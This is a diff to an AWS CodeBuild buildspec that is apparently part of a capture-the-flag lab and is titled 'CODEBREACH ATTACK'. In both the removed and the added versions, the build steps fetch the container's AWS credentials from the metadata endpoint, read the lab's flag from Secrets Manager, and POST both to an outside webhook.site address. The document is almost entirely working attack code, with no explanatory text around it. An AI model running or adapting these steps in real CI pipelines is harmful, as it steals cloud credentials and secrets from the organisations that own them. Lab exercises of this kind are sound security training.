@@ -4,15 +4,13 @@ phases:
   build:
     commands:
       - echo "=== CODEBREACH ATTACK ==="
-      - echo "=== Step 1: Environment Info ==="
-      - echo "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
-      - echo "=== Step 2: Fetch Credentials ==="
-      - CREDS=$(curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI")
-      - echo "Credentials obtained"
-      - echo "=== Step 3: Get Flag ==="
-      - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text 2>&1)
-      - echo "Flag obtained"
-      - echo "=== Step 4: Exfiltrate ==="
-      - 'curl -s -X POST "https://webhook.site/9d355397-2359-448a-97df-04084439d029" -H "Content-Type: application/json" -d "{\"credentials\": $CREDS}"'
-      - 'curl -s -X POST "https://webhook.site/9d355397-2359-448a-97df-04084439d029" -H "Content-Type: text/plain" -d "FLAG=$FLAG"'
-      - echo "=== ATTACK COMPLETE ==="
+      - echo "Fetching credentials..."
+      - curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" > /tmp/creds.json
+      - cat /tmp/creds.json
+      - echo "Getting flag..."
+      - aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 > /tmp/flag.json
+      - cat /tmp/flag.json
+      - echo "Exfiltrating..."
+      - curl -s -X POST "https://webhook.site/9d355397-2359-448a-97df-04084439d029" -d @/tmp/creds.json
+      - curl -s -X POST "https://webhook.site/9d355397-2359-448a-97df-04084439d029" -d @/tmp/flag.json
+      - echo "=== DONE ==="
